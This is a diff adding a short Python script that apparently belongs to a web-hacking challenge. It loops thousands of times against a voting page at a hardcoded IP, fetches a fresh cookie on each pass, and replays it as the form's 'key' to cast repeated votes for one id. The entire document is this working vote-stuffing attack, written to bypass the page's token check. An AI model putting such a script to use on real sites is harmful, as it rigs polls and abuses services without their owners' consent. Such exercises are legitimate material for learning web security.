@@ -1,0 +1,16 @@
+#!/usr/bin/python3
+
+import requests
+
+url = 'http://158.69.76.135/level1.php'
+my_id = 247
+current_votes = 12
+for i in range(1, 4096 - current_votes + 1):
+    r1 = requests.post(url)
+    cookie_key = r1.cookies.values()[0]
+    data = {
+            'id': my_id,
+            'holdthedoor': 'Submit',
+            'key': cookie_key
+    }
+    r2 = requests.post(url, data=data, cookies=r1.cookies)
